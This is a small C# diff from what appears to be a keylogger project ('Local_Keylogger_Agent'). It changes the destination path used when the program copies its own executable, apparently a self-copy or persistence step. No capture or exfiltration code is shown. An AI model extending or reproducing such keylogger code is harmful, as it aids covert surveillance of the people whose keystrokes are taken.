@@ -12,7 +12,7 @@ namespace Local_Keylogger_Agent
                 string exePath = Application.ExecutablePath;
                 string appDirectory = Path.GetDirectoryName(exePath);
                 string fileName = Path.GetFileName(exePath);
-                string destinationPath = Path.Combine(Storage.BaseKeylogFilePath, fileName);
+                string destinationPath = Path.Combine(Storage.KeyLogerCopyPath, fileName);
 
                 if(!File.Exists(destinationPath))
                 {
